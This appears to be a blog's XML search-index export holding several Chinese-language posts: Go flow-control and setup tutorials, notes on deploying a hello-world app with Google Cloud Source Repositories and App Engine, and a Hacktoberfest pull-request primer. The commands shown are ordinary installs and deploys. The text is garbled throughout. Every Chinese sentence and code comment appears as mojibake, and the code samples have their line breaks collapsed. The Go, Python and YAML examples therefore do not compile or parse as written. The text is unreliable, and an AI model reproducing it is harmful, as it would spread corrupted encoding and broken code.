 package mainimport &quot;fmt&quot;if taste := &quot;è”¥èŠ±è›‹&quot;; taste == &quot;èœè„¯è›‹&quot; &#123;    fmt.Println(&quot;åŠ å…¥èœè„¯&quot;)&#125; else &#123;    fmt.Println(&quot;åŠ å…¥è”¥èŠ±&quot;)&#125;fmt.Println(taste) // ç·¨è­¯éŒ¯èª¤ï¼Œæ¢ä»¶åˆ¤æ–·æ•˜è¿°å®£å‘Šçš„è®Šæ•¸ï¼Œåªæœƒå­˜æ´»æ–¼æ¢ä»¶é‚è¼¯å€å¡Šä½¿ç”¨ä¸Š

goto Go ä¸­é‚„æä¾›äº† goto èªæ³•ï¼Œè®“ä½ å¯ä»¥ç›´æ¥è·³èºåˆ°æŸå®šç¾©å€å¡Šï¼Œä½†å»ºè­°å°å¿ƒä½¿ç”¨ã€‚
 package mainimport &quot;fmt&quot;func main() &#123;    num := 91    if num &gt;= 60 &#123;        fmt.Println(&quot;hi true&quot;)        goto PASS    &#125; else &#123;        fmt.Println(&quot;hi false&quot;)    &#125;    PASS:        fmt.Println(&quot;hi pass&quot;)&#125;

for è¿´åœˆ åœ¨ go ä¸­ for è¿´åœˆçš„åŠŸèƒ½å¼·å¤§ï¼Œæ—¢å¯ä»¥è¢«ç•¶åšå¾ªç’°è®€å–è³‡æ–™ï¼Œåˆå¯ä»¥ç•¶åš while ä¾†æ§åˆ¶é‚è¼¯ï¼Œé‚„èƒ½åè¦†æ“ä½œé‹ç®—ï¼Œä»¥ä¸‹ä»‹ç´¹ for èªæ³•ï¼š
 for è®Šæ•¸å®£å‘Šæˆ–å‡½å¼å›å‚³å€¼; æ¢ä»¶åˆ¤æ–·; æ¯è¼ªçµæŸæ™‚æ“ä½œ &#123;    // ...&#125;

 æˆ‘å€‘æ¥è‘—ä½¿ç”¨é£Ÿè­œç¯„ä¾‹ï¼Œä¸­ç«å¿«ç‚’ï¼Œç¿»äº”æ¬¡é¢ï¼š
 package mainimport &quot;fmt&quot;func main() &#123;    for index := 0; index &lt; 5; index++ &#123;        fmt.Println(&quot;ç¿»é¢&quot;, index + 1, &quot;æ¬¡&quot;)            &#125;&#125;

 ç•¶æˆ‘å€‘ä¸çŸ¥é“å…·é«”è¦è¿´åœˆå¹¾æ¬¡æ™‚å¯ä»¥ä½¿ç”¨ whileï¼Œä½†ç”±æ–¼ Go ä¸­æ²’æœ‰ while é—œéµå­—ï¼Œç•¶å¿½ç•¥äº† ;ï¼Œå°±å¯ä»¥ç•¶ while è¿´åœˆä½¿ç”¨ï¼š
 package mainimport &quot;fmt&quot;// å¾ 1 åŠ åˆ° 10func main() &#123;    sum := 0    i := 0    for i &lt;= 10 &#123;        sum += i        i++    &#125;    fmt.Println(sum)&#125;

 ä½¿ç”¨ break å’Œ continue å¯ä»¥è·³å‡ºæ•´å€‹å¾ªç’°å’Œè·³éç•¶ä¸‹ï¼š
 package mainimport &quot;fmt&quot;// å¾ 1 åŠ åˆ° 10func main() &#123;    sum := 0    i := 0    for i &lt;= 10 &#123;        if i == 3 &#123;            break; // continue è·³é 3ï¼Œbreak åˆ° 3 æ•´å€‹å¾ªç’°è·³å‡º        &#125;        sum += i        i++    &#125;    fmt.Println(sum)&#125;

 å–„ç”¨ for ä¹Ÿå¯ä»¥æŠŠ slice å’Œ map è³‡æ–™ä¸€ä¸€å–å‡ºï¼š
 package mainimport &quot;fmt&quot;for key, value := range map &#123; // ä¹Ÿå¯ä»¥å¿½ç•¥å…¶ä¸­ä¸€å€¼ï¼Œfor _, value := range map    fmt.Println(key, value)&#125;

switch ç•¶æˆ‘å€‘éœ€è¦å¯«å¾ˆå¤š if...else æ™‚å°±æ˜¯ä½¿ç”¨ switch çš„å¥½æ™‚æ©Ÿï¼š
 package mainimport &quot;fmt&quot;func main() &#123;    i := 2    switch i &#123;        case 1:            fmt.Println(&quot;hello:&quot;, i) // go ä¸­ä¸ç”¨åŠ  break æœƒè‡ªå·±è·³å‡ºä¸æœƒå¾€ä¸‹åŸ·è¡Œ        case 2:            fmt.Println(&quot;hello:&quot;, i) // åŠ ä¸Š fallthrough å¯ä»¥å¼·åˆ¶å¾€ä¸‹åŸ·è¡Œ            fallthrough        default:            fmt.Println(&quot;hello: default&quot;)            &#125;	&#125;

ç¸½çµä»¥ä¸Šå°±æ˜¯é—œæ–¼ Go ç¨‹å¼èªè¨€çš„åŸºæœ¬èªæ³•ä¸­æµç¨‹æ§åˆ¶ä»‹ç´¹ï¼Œæ¥ä¸‹ä¾†çš„æ–‡ç« æˆ‘å€‘å°‡é€é Golang Web ç¨‹å¼è¨­è¨ˆä¾†å­¸ç¿’ Go é€™å€‹ç¨‹å¼èªè¨€çš„æ–¹æ–¹é¢é¢ã€‚
åƒè€ƒæ–‡ä»¶
A tour of go
Go Tutorial
Go by Example
Go Programming Language: An Introductory Tutorial
Go tour Exercise
Ubuntu Go install
å¾Goçœ‹ç¾ä»£ç¨‹å¼èªè¨€

ï¼ˆimage via cuelogicï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>web</tag>
        <tag>ç¨‹å¼è¨­è¨ˆ</tag>
        <tag>programming</tag>
        <tag>coding</tag>
        <tag>computer science</tag>
        <tag>é›»è…¦ç§‘å­¸</tag>
        <tag>GO</tag>
        <tag>GO lang</tag>
        <tag>golang</tag>
        <tag>go web</tag>
        <tag>è‡ªå­¸ç¨‹å¼</tag>
        <tag>è‡ªå­¸ç¨‹å¼è¨­è¨ˆ</tag>
        <tag>ç·šä¸Šè‡ªå­¸</tag>
        <tag>coder</tag>
        <tag>computer</tag>
        <tag>code</tag>
        <tag>å­¸å¯«ç¨‹å¼</tag>
        <tag>å­¸ç¨‹å¼</tag>
      </tags>
  </entry>
  <entry>
    <title>Go Web ç¨‹å¼è¨­è¨ˆå…¥é–€æ•™å­¸ï¼šåŸºç¤ä»‹ç´¹èˆ‡ç’°å¢ƒå»ºç½®</title>
    <url>/2017/09/09/golang101-tutorial-introduction/</url>
    <content><![CDATA[
å‰è¨€Go ç¨‹å¼èªè¨€ æ˜¯ Google æ¨å‡ºçš„éœæ…‹ç¨‹å¼èªè¨€ï¼Œå…¶ç‰¹è‰²åœ¨æ–¼æ ¸å¿ƒèªæ³•å’Œé—œéµå­—éå¸¸ç²¾ç°¡ï¼ˆå…¨éƒ¨åªæœ‰ 25 å€‹é—œéµå­—ï¼ï¼‰ä¸¦æ“·å–äº†éœæ…‹èªè¨€çš„æ•ˆèƒ½å’Œå‹•æ…‹èªè¨€çš„é–‹ç™¼æ•ˆç‡çš„å„ªé»ï¼Œå…·å‚™åƒåœ¾å›æ”¶ã€å¿«é€Ÿç·¨è­¯ç­‰ç‰¹æ€§ï¼Œä¸”é‡å°å¹³è¡ŒåŒ–ç¨‹å¼è¨­è¨ˆåœ¨ä½¿ç”¨ä¸Šéå¸¸æ–¹ä¾¿ã€‚æ¥ä¸‹ä¾†çš„æ–‡ç« æˆ‘å€‘å°‡é€é Golang Web ç¨‹å¼è¨­è¨ˆä¾†å­¸ç¿’ Go é€™å€‹ç¨‹å¼èªè¨€ã€‚ç¨‹å¼èªè¨€å”¯æœ‰å‹•æ‰‹ä½œæ‰èƒ½å­¸çš„å¥½ï¼Œä½ å¯ä»¥åƒè€ƒæœ¬ç¯‡æ–‡ç« å»ºç½®é–‹ç™¼ç’°å¢ƒæˆ–æ˜¯ä½¿ç”¨ç·šä¸Šé–‹ç™¼ç’°å¢ƒé€²è¡Œå­¸ç¿’ã€‚
Go ç’°å¢ƒå»ºç½®å®‰è£æ–¹å¼ï¼š

å®˜ç¶²å¥—è£å®‰è£ï¼Œç·šä¸Šä¹Ÿæœ‰å®˜æ–¹æä¾›çš„ playground ç·šä¸ŠåŸ·è¡Œç’°å¢ƒå¯ä»¥ä½¿ç”¨

ä½¿ç”¨å¥—ä»¶ç®¡ç†å·¥å…· homebrewï¼ˆmacï¼‰ã€apt-getï¼ˆlinuxï¼‰ ç­‰é€²è¡Œå®‰è£
 ä¾‹å¦‚ï¼Œåœ¨ linux ä¸Šå®‰è£ï¼š
 $ sudo apt-get install golang-go

 æˆ–æ˜¯ä¸»å‹•å®£å‘Šç‰ˆæœ¬
 $ sudo apt-get install golang-1.8-go

 åœ¨ mac ä¸Šå®‰è£ï¼š
 $ brew install go

ä½¿ç”¨ gccã€MinGWï¼ˆwindowsï¼‰ç­‰ç·¨è­¯å™¨ç·¨è­¯åŸå§‹ Go æª”æ¡ˆ


å°æ–¼ä¸€èˆ¬åˆå­¸è€…ä¾†èªªï¼Œå¯ä»¥ä½¿ç”¨å®˜ç¶²æˆ–æ˜¯å¥—ä»¶ç®¡ç†å·¥å…·ä¾†å®‰è£ï¼Œå¯ä»¥ç•™æ„ç’°å¢ƒè®Šæ•¸æ˜¯å¦æœ‰è¨­å®šæˆåŠŸã€‚
è‹¥æœ‰æˆåŠŸå®‰è£ï¼Œå¯ä»¥æ‰“é–‹çµ‚ç«¯æ©ŸåŸ·è¡Œ go version æœƒå‡ºç¾ç›¸é—œç‰ˆæœ¬è¨Šæ¯ï¼Œä»¥ä¸‹æ˜¯ mac çš„ç¯„ä¾‹ï¼š
$ go versiongo version go1.9 darwin/amd64

åœ¨ Go ä¸­ä¹Ÿæä¾›äº†è¨±å¤šæ–¹ä¾¿æŒ‡ä»¤ï¼Œæ–¹ä¾¿æˆ‘å€‘ç·¨è­¯ã€æ¸¬è©¦å’ŒåŸ·è¡Œç¨‹å¼ï¼š

ç·¨è­¯æª”æ¡ˆ
$ go build

åŸ·è¡Œå–®å…ƒæ¸¬è©¦ï¼ˆunit testingï¼‰ï¼ŒGo ä¸€é–‹å§‹å°±å…§å»ºäº†æ¸¬è©¦çš„æ©Ÿåˆ¶ï¼ŒåŸ·è¡Œ go test çš„è©±ï¼Œæœƒè‡ªå‹•è®€å–å¥—ä»¶ç›®éŒ„ä¸­çš„ *_test.go ä¾†é€²è¡Œç·¨è­¯ã€æ¸¬è©¦
$ go test

è®“ç¨‹å¼å¯ä»¥æ ¼å¼åŒ– formattingï¼Œç¬¦åˆ go çš„ convention
$ go fmt

å®‰è£å¥—ä»¶
$ go get

éœæ…‹åˆ†ææ½›åœ¨ bug
$ go vet

å¯ä»¥å¿«é€Ÿ build ä¸¦åŸ·è¡Œç¨‹å¼
$ go run

å±•ç¤º go ç›¸é—œæ–‡ä»¶
$ godoc

é‡æ–°å‘½åè®Šæ•¸å’Œå‡½å¼
$ gorename

ç”¢ç”Ÿç¨‹å¼ç¢¼
$ go generate

ä½ çš„ç¬¬ä¸€å€‹ Go ç¨‹å¼åœ¨ Go ä¸­ç¨‹å¼é‹è¡Œçš„å…¥å£æ˜¯å¥—ä»¶ mainã€‚åœ¨é€™å€‹ç¨‹å¼ä¸­ä½¿ç”¨ä¸¦å°å…¥äº†å¥—ä»¶ â€œfmtâ€ï¼Œåœ¨ Go ç¨‹å¼ä¸­ç¨‹å¼åŸ·è¡Œå…¥å£æ˜¯ main functionï¼Œè‹¥æˆåŠŸåœ¨çµ‚ç«¯æ©ŸåŸ·è¡Œ $ go runï¼Œå‰‡æœƒåœ¨çµ‚ç«¯æ©Ÿå°å‡º Hello, World! çš„ Go ç¨‹å¼ï¼Œæ­å–œå®Œæˆä½ çš„ç¬¬ä¸€å€‹ Go ç¨‹å¼äº†ï¼
// å®£å‘Šç¨‹å¼å±¬æ–¼å“ªå€‹ packagepackage main// å¼•å…¥å¥—ä»¶import (    &quot;fmt&quot;)// ç¨‹å¼åŸ·è¡Œå…¥å£func main() &#123;    // ä½¿ç”¨ fmt å¥—ä»¶å°å‡ºå­—ä¸² wordï¼Œä½¿ç”¨ := ç°¡åŒ–åŸæœ¬è®Šæ•¸å®£å‘Š var word string = &quot;Hello, World!&quot;    word := &quot;Hello, World!&quot;    fmt.Println(word)&#125; 

å¦å¤–ä¸€å€‹ç¯„ä¾‹æ˜¯å¼•å…¥äº† math/rand å¥—ä»¶ç”¢ç”Ÿéš¨æ©Ÿæ•´æ•¸ï¼ˆç”±æ–¼ç’°å¢ƒä¸­ seed ä¸€æ¨£æ‰€ä»¥æœƒå°å‡ºåŒæ¨£å€¼ï¼‰
package mainimport (  &quot;fmt&quot;  &quot;math/rand&quot;)func main() &#123;	fmt.Println(&quot;My favorite number is&quot;, rand.Intn(10))&#125;

Go æœ‰æ”¯æ´è¨±å¤šç¶²è·¯ç¨‹å¼é–‹ç™¼çš„å¥—ä»¶ï¼Œå¯ä»¥ç”¨å¾ˆç°¡å–®çš„å¹¾è¡Œå°±å®Œæˆç¶²è·¯ä¼ºæœå™¨çš„å»ºç½®ï¼š
package mainimport (    &quot;io&quot;    &quot;net/http&quot;)// è™•ç† request å’Œ response çš„å‡½å¼func hello(w http.ResponseWriter, r *http.Request) &#123;    // å°å‡º hello world    io.WriteString(w, &quot;Hello world!&quot;)&#125;func main() &#123;    // router è®“ç¶²å€å¯ä»¥å°æ‡‰è™•ç†å‡½å¼    http.HandleFunc(&quot;/&quot;, hello)    // ç›£è½ 8000 port    http.ListenAndServe(&quot;:8000&quot;, nil)&#125;

ç¸½çµä»¥ä¸Šå°±æ˜¯é—œæ–¼ Go ç¨‹å¼èªè¨€çš„åŸºæœ¬æ•™å­¸ä»‹ç´¹å’Œç’°å¢ƒå»ºç½®ï¼Œæ¥ä¸‹ä¾†çš„æ–‡ç« æˆ‘å€‘å°‡é€é Golang Web ç¨‹å¼è¨­è¨ˆä¾†å­¸ç¿’ Go é€™å€‹ç¨‹å¼èªè¨€çš„æ–¹æ–¹é¢é¢ã€‚
åƒè€ƒæ–‡ä»¶
A tour of go
Go Tutorial
Go by Example
Go Programming Language: An Introductory Tutorial
Go tour Exercise
Ubuntu Go install
å¾Goçœ‹ç¾ä»£ç¨‹å¼èªè¨€

ï¼ˆimage via cuelogicï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>web</tag>
        <tag>ç¨‹å¼è¨­è¨ˆ</tag>
        <tag>programming</tag>
        <tag>coding</tag>
        <tag>computer science</tag>
        <tag>é›»è…¦ç§‘å­¸</tag>
        <tag>GO</tag>
        <tag>GO lang</tag>
        <tag>golang</tag>
        <tag>go web</tag>
        <tag>è‡ªå­¸ç¨‹å¼</tag>
        <tag>è‡ªå­¸ç¨‹å¼è¨­è¨ˆ</tag>
        <tag>ç·šä¸Šè‡ªå­¸</tag>
        <tag>coder</tag>
        <tag>computer</tag>
        <tag>code</tag>
        <tag>å­¸å¯«ç¨‹å¼</tag>
        <tag>å­¸ç¨‹å¼</tag>
      </tags>
  </entry>
  <entry>
    <title>Google Cloud Source Repositories ä½¿ç”¨ç´€éŒ„</title>
    <url>/2018/10/12/google-cloud-source-repositories-record/</url>
    <content><![CDATA[å‰è¨€GCSR(Google Cloud Source Repositories) æ˜¯ Google æ¨å‡ºä»¥ git ç‚ºåŸºç¤çš„ç¨‹å¼ç¢¼ä»£ç®¡æœå‹™ã€‚
åŸå…ˆæˆ‘çš„ Side Project ä¹Ÿæ˜¯è‡ªå·±å»º git server ä¾†æ”¾ï¼Œå¾Œä¾†å› ç‚ºç¡¬é«”æ•…éšœç­‰ç­‰ï¼Œè‡ªå·±ç¶­è­·éœ€è¦èŠ±è²»ä¸å°‘æ™‚é–“å’Œæˆæœ¬(æ‡¶!)ï¼ŒåŠ ä¸Šæœ¬èº«ä¹Ÿæ˜¯ Google çš„æ„›å¥½è€…ï¼Œæœ€å¾Œé¸æ“‡ GCSR ä¾†è©¦è©¦ã€‚
é¦–å…ˆè«‡è«‡ GCSR çš„ç¼ºé»ï¼ŒåŸºæœ¬ä¸Šç¬¬ 1 å€‹ç¼ºé»ç‚º GCSR å¿…é ˆä¾é™„æ–¼ Google Cloud Platform(GCP)ã€‚

ä¹Ÿå°±æ˜¯èªªä½ å¿…é ˆå…ˆäº†è§£åŸºæœ¬çš„ GCP ä½¿ç”¨æ–¹å¼

ç¬¬ 2 å€‹ç¼ºé»åœ¨æ–¼å»ºç«‹å’Œæ‹·è² Repository çš„å‹•ä½œå¿…é ˆé€é Google Cloud SDKã€‚

ä¹Ÿå°±æ˜¯èªªä½ å¿…é ˆå…ˆå®‰è£ Google Cloud SDK

ç¬¬ 3 å€‹ç¼ºé»åœ¨æ–¼ GCSR å…è²»ç‰ˆçš„é™åˆ¶


Repository æœ€å¤š 5 ä½ä½¿ç”¨è€…ï¼Œæ¯å¢åŠ  1 äººï¼Œæ¯æœˆ 1 ç¾é‡‘
Repository å„²å­˜ç©ºé–“æœ€å¤§ 50 GBï¼Œæ¯å¢åŠ  1 GBï¼Œæ¯æœˆ 0.10 ç¾é‡‘
Repository æœ€å¤§ 50 GB è¼¸å‡ºï¼Œæ¯å¢åŠ  1 GB è¼¸å‡ºï¼Œæ¯æœˆ 0.10 ç¾é‡‘


ç¼ºé»çœ‹å®Œäº†ï¼Œæˆ‘å€‘ä¾†çœ‹çœ‹å„ªé»å§ã€‚
å€‹äººèªç‚º GCSR æœ€å¤§çš„å„ªé»åœ¨æ–¼å¯ä»¥é€£çµ Google Cloud Platform æ­é…ä¸åŒå·¥å…·ä»¥é€²è¡Œæ“´å……ã€‚å…¶æ¬¡åœ¨æ–¼é€Ÿåº¦åŠå®‰å…¨æ€§æœ‰ä¸€å®šçš„ä¿éšœï¼ŒåŠ ä¸Šå…§å»º CI åŠŸèƒ½å’Œ User Interfaceï¼Œå„ªæ–¼ç¾ä»Šä¸€èˆ¬çš„ç¨‹å¼ç¢¼è¨—ç®¡æœå‹™ã€‚
ä»¥ä¸Šçš„å„ªç¼ºé»è‹¥æ‚¨éƒ½èƒ½æ¥å—ï¼Œé‚£å°±ç¹¼çºŒå¾€ä¸‹çœ‹å§ã€‚
é¦–å…ˆæä¾›å®˜ç¶² GCSR çš„èªªæ˜ã€‚è‹¥æƒ³ç›´æ¥åƒè€ƒä½¿ç”¨æ–¹å¼è«‹çœ‹ Quick Startã€‚
1. å¦‚ä½•åœ¨ GCSR ä¸Šå»ºç«‹å°ˆæ¡ˆä»¥åŠè¤‡è£½å°ˆæ¡ˆåˆ°æœ¬åœ°ç«¯
åœ¨ Google Cloud Platform å»ºç«‹å°ˆæ¡ˆ
 å»ºè­°æ–°å¢ç¨ç«‹çš„ GCP å°ˆæ¡ˆä¾†æ”¾ç½® Repository é¿å…å’Œå…¶ä»–çš„å°ˆæ¡ˆæ··æ·†ã€‚

å®‰è£ Google Cloud SDK
 å®‰è£ SDK çš„ç›®çš„å°±æ˜¯ç”¨ä¾†æ–°å¢ï¼Œè¤‡è£½å°ˆæ¡ˆã€‚æ³¨æ„å®‰è£å®Œæˆä¹‹å¾Œé‚„éœ€è¦é€²è¡Œåˆå§‹åŒ–çš„å‹•ä½œï¼Œåƒè€ƒé€™è£¡ã€‚

å®‰è£ git
 Windows ç³»çµ±å®˜æ–¹æ¨è–¦ä½¿ç”¨ git-scmï¼ŒLinux ç³»çµ±å°±ç”¨ command line å®‰è£ git å§

å»ºç«‹ hello-world Repository(Google Cloud SDK)
 gcloud source repos create hello-world

æ‹·è² hello-world Repository åˆ° local
 gcloud source repos clone hello-world


2. åŠ å…¥ HelloWorld script å’Œ Deploy æª”æ¡ˆ1.ç§»å‹•åˆ°æœ¬åœ°ç«¯ hello-world ç›®éŒ„ä¸¦æ–°å¢ main.py æª”æ¡ˆï¼Œå°‡ä¸‹æ–¹å…§å®¹è¤‡è£½åˆ° main.py
!/usr/bin/env python import webapp2 class MainHandler(webapp2.RequestHandler):   def get(self):      self.response.write(&#x27;Hello World!&#x27;) app = webapp2.WSGIApplication([   (&#x27;/&#x27;, MainHandler)], debug=True)
2.æ–°å¢ app.yaml æª”æ¡ˆï¼Œå°‡ä¸‹æ–¹å…§å®¹è¤‡è£½åˆ° app.yaml
runtime: python27api_version: 1threadsafe: yes handlers:- url: .*script: main.app libraries:- name: webapp2version: &quot;2.5.2&quot;

3.push åˆ°é ç«¯ hello-world Repository
git add . git commit -m &quot;Add Hello World app to Cloud Source Repositories&quot; git push origin master

3. éƒ¨ç½²åˆ° App Engine1.è¼¸å…¥ä»¥ä¸‹æŒ‡ä»¤ä»¥éƒ¨ç½²åˆ° App Engine
gcloud app deploy app.yaml
2.ç¢ºèªéƒ¨ç½²å…§å®¹æ˜¯å¦æˆåŠŸ
gcloud app browse
å®Œæˆå¾Œæ‡‰è©²æœƒé–‹å•Ÿç€è¦½å™¨ä¸¦é¡¯ç¤º Hello World!
ç¸½çµç¶“ç”±ä¸Šè¿°çš„åˆ†äº«ä½ å°±èƒ½é€²è¡ŒåŸºæœ¬çš„ GCSR æ“ä½œï¼Œä½†ä½¿ç”¨ GCSR çš„å„ªå‹¢å¯ä¸åƒ…æ–¼æ­¤ï¼Œä½ å¯ä»¥é€é App Engine é›²ç«¯éƒ¨å±¬ï¼Œæ•´åˆ Cloud Build è‡ªå‹•ç·¨è­¯ï¼Œä½¿ç”¨ Cloud Debugger é€²è¡Œé™¤éŒ¯ã€‚
]]></content>
      <tags>
        <tag>google cloud</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacktoberfestï¼šä¸€èµ·è¸å…¥ open source çš„ä¸–ç•Œå§ï¼</title>
    <url>/2016/10/14/hacktoberfest-2016/</url>
    <content><![CDATA[ï¼ˆåœ–ç‰‡ä¾†è‡ªï¼š Hacktoberfest is backï¼‰
å‰è¨€Hacktoberfest æ˜¯ç”± hack + october + festival çµ„åˆè€Œæˆçš„åè©ï¼Œæ˜¯ç”±çŸ¥åçš„ VPS ä¾›æ‡‰å•† DigitalOcean èˆ‡å¤§å®¶æ‰€ç†ŸçŸ¥çš„ github  æ‰€èˆ‰è¾¦çš„æ´»å‹•ï¼Œç›®çš„åœ¨æ–¼æ¨å»£ open sourceï¼Œå¸Œæœ›è¨±å¤šäººèƒ½è—‰ç”±é€™å€‹æ´»å‹•è¸é€² open source çš„ä¸–ç•Œã€‚
é€™å€‹æ´»å‹•çš„å£è™Ÿæ˜¯ï¼š

Support and celebrate open source. Earn a limited edition T-shirt.

åªè¦åœ¨åæœˆä»½é€å››å€‹ Pull Requestï¼ˆä»»ä½•åœ¨ github ä¸Šå…¬é–‹çš„ repo éƒ½å¯ä»¥ï¼‰ï¼Œå°±ç¬¦åˆå…è²»æ‹¿ T-shirt çš„æ¢ä»¶ï¼
åœ¨ æ´»å‹•ç¶²ç«™ ä¸Šï¼Œæœ‰ä¸€äº› Featured Projectsï¼Œä½ å¯ä»¥ç›´æ¥å»çœ‹çœ‹æœ‰æ²’æœ‰ issue æ˜¯ä½ å¯ä»¥å¹«å¿™è§£çš„ã€‚
ç•¶ç„¶ï¼Œå¦‚æœä½ è·Ÿæˆ‘ä¸€æ¨£ï¼Œæ˜¯å€‹é–‹æºåˆå¿ƒè€…ï¼Œç¶²ç«™ä¸‹æ–¹ä¹Ÿæœ‰è¨±å¤šæœ‰ç”¨çš„æ–‡ç« ï¼Œå¯ä»¥å¹«åŠ©ä½ äº†è§£å¦‚ä½•å°é–‹æºå°ˆæ¡ˆåšå‡ºè²¢ç»ã€‚
å¿ƒå¾—å„˜ç®¡ç¾åœ¨å¹¾ä¹æ‰€æœ‰çš„å·¥ç¨‹å¸«éƒ½è½é githubï¼Œä¹Ÿå¶çˆ¾æœƒçœ‹åˆ°ä¸€äº›æœ‰è¶£çš„å°ˆæ¡ˆï¼›ç”šè‡³é€£å¾ˆå¤šå…¬å¸åœ¨å¾µæ‰çš„æ™‚å€™ï¼Œéƒ½æœƒè¦æ±‚é™„ä¸Š github å¸³è™Ÿã€‚ä½†æ˜¯ï¼Œæˆ‘ç›¸ä¿¡æœ‰å¾ˆå¤šäººè·Ÿæˆ‘ä¸€æ¨£ï¼Œã€Œå¹¾ä¹å¾ä¾†æ²’æœ‰é€é Pull Requestï¼ˆä»¥ä¸‹ç°¡ç¨± PRï¼‰ã€ã€‚
æ‰€ä»¥é€™ç¯‡æ–‡ç« ä¸»è¦æ˜¯æƒ³å®£å‚³ä¸€ä¸‹é€™å€‹æ´»å‹•ï¼Œå¸Œæœ›å¤§å®¶éƒ½æœ‰æ©Ÿæœƒé«”é©—åˆ°é€ PR çš„æ„Ÿè¦ºï¼Œé †ä¾¿ç°¡å–®å¯«çµ¦æ–°æ‰‹ä¸€äº›æ•™å­¸ï¼Œè®“ä½ çŸ¥é“ä»€éº¼æ˜¯ PRã€‚
PR æ˜¯ä»€éº¼ï¼Ÿç°¡å–®ä¾†èªªï¼Œç•¶ä½ åœ¨ github ä¸Šé¢æŸå€‹å°ˆæ¡ˆçœ‹åˆ°ä¸€äº› issue çš„æ™‚å€™ï¼Œä½ å°±å¯ä»¥è©¦è‘—å»è§£æ‰é€™å€‹ issueã€‚
é€™é‚Šçš„ issue æŒ‡çš„ä¸ä¸€å®šæ˜¯ç¨‹å¼ç™¼ç”Ÿçš„ bugï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æ–‡ä»¶ä¸å¤ å®Œæ•´ï¼Œéœ€è¦åŠ å¼·ï¼Œæˆ–è€…æ˜¯è¦å¹«å¿™å¯«æ¸¬è©¦ï¼Œæˆ–åªæ˜¯ç°¡å–®çš„è£œä¸Šå°ˆæ¡ˆçš„ License ç­‰ç­‰ã€‚
ç‚ºäº†è¦ä¿®æ”¹é€™å€‹å°ˆæ¡ˆï¼Œä½ å¿…é ˆè¦ fork ä¸€ä»½åˆ°è‡ªå·±çš„å¸³è™Ÿåº•ä¸‹ï¼Œç”¨é€™ä»½å°ˆæ¡ˆç•¶ä½œåŸºåº•ä¾†ä¿®æ”¹ï¼ˆä¸€èˆ¬ä¾†èªªï¼Œé‚„æœƒæ–°å¢ä¸€å€‹ branchï¼‰ï¼Œä¿®æ”¹å®Œä»¥å¾Œï¼Œä½ è¦æ€éº¼æŠŠé€™äº›ä¿®æ”¹å¥½çš„ commit ç™¼çµ¦åŸä½œè€…å‘¢ï¼Ÿ
å› ç‚ºåŸæœ¬çš„é‚£å€‹å°ˆæ¡ˆä¸æ˜¯ä½ çš„ï¼Œä½ æ²’æœ‰æ¬Šé™ï¼ˆfork çš„é‚£ä¸€ä»½ä½ æ‰æœ‰æ¬Šé™ï¼‰ï¼Œæ‰€ä»¥ä½ åˆä¸èƒ½ç›´æ¥ push åˆ°åŸæœ¬çš„ä¸Šé¢ï¼Œé‚£åŸä½œè€…è¦æ€éº¼æ”¶åˆ°ä½ é€™ä»½ä¿®æ”¹å®Œæˆçš„ code å‘¢ï¼Ÿ
æ²’éŒ¯ï¼é€™å€‹æ™‚å€™å°±éœ€è¦ Pull Requestï¼Œæäº¤ä¸€å€‹ PRã€‚
ç•¶ä½ æäº¤ PR çš„æ™‚å€™ï¼Œå¯ä»¥æŒ‡å®šä½ è‡ªå·±çš„ branch è·ŸåŸä½œè€…é‚£é‚Šçš„ branchï¼Œä¸¦ä¸”æŠŠä½ å‰›å‰›æ–°å¢çš„ commit é¡¯ç¤ºå‡ºä¾†ï¼Œå°±å¯ä»¥æäº¤ä¸€å€‹æ–°çš„ PR çµ¦åŸä½œè€…ï¼Œè®“åŸä½œè€…å»å¯©æ ¸é€™å€‹ commitã€‚å¦‚æœé †åˆ©çš„è©±ï¼Œå°±æœƒç›´æ¥æŠŠä½ é€™å€‹ commit merge é€²å»åŸä¾†çš„å°ˆæ¡ˆï¼Œé€™ä»½å°ˆæ¡ˆå°±æœ‰ä½ çš„è²¢ç»åœ¨è£¡é¢äº†ï¼
å¦‚æœä½ éœ€è¦æ›´è©³ç´°åœ°è¬›è§£ï¼Œå¯ä»¥åƒè€ƒï¼š
èŠ±20åˆ†é’Ÿå†™çš„-å¤§ç™½è¯è®²è§£å¦‚ä½•ç»™githubä¸Šé¡¹ç›®è´¡çŒ®ä»£ç 3.3 åˆ›å»ºPull RequestGithub ç™¼ Pull Request &amp; è²¢ç»æµç¨‹é€ŸæŸ¥6.2 GitHub - åƒèˆ‡ä¸€å€‹å°ˆæ¡ˆ
è©³ç´°æµç¨‹ç°¡ä»‹é€é hacktoberfest é€™å€‹æ´»å‹•ï¼Œæˆ‘æ‰¾åˆ°ä¸€äº›å°æ–°æ‰‹éå¸¸å‹å–„çš„ issueï¼Œèº«ç‚ºä¸€å€‹æ–°æ‰‹ï¼Œæˆ‘ååˆ†æ„Ÿå‹•ã€‚ä¾‹å¦‚èªªæˆ‘å€‘å¯ä»¥ä¾†çœ‹çœ‹ é€™ä¸€å€‹ Telescope çš„ issue


é€™ issue ç›´æ¥è·Ÿä½ è¬›èªªä½ éœ€è¦æœƒä»€éº¼ã€è¦è§£æ±ºçš„å•é¡Œæ˜¯ä»€éº¼ï¼Œä»¥åŠå¦‚æœä½ æ˜¯ç¬¬ä¸€æ¬¡ contribute çš„è©±ï¼Œä½ æ‡‰è©²è¦æ³¨æ„å“ªäº›äº‹é …ï¼Œæä¾› step by step çš„æ­¥é©Ÿçµ¦ä½ ã€‚
å¾ˆå‹å–„å°å§ï¼
